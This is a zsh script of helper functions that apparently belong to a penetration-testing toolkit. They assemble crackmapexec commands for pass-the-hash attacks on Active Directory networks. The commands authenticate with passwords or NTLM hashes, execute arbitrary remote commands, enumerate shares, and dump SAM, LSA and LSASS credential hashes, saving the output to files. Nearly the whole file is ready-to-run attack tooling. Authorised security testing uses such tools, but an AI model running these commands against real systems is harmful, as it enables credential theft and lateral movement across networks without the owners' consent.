#!/usr/bin/env zsh

############################################################# 
# nb-ad-pth
#############################################################
nb-ad-pth-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-pth
------------
The nb-ad-pth namespace contains commands for pass-the-hash attack on Active Directory DC server.

Commands
--------
nb-ad-pth-install         installs dependencies
nb-ad-pth-pass            pass the password/hash
nb-ad-pth-pass-command    the password/hash and execute command
nb-ad-pth-enum            enumerate shares
nb-ad-pth-sam             dump SAM hashes
nb-ad-pth-lsa             dump LSA hashes
nb-ad-pth-lsassy          dump LSASSY hashes
DOC
}

nb-ad-pth-install() {
    __info "Running $0..."
    __pkgs crackmapexec
}

nb-ad-pth-pass() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netadpath)/cme-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-pass-command() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Enter command to execute"
    local cm && __askvar cm "COMMAND"

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x $cm | tee $(__netadpath)/cme-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netadpath)/cme-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-enum() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-sam() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-lsa() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-pth-lsassy() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}
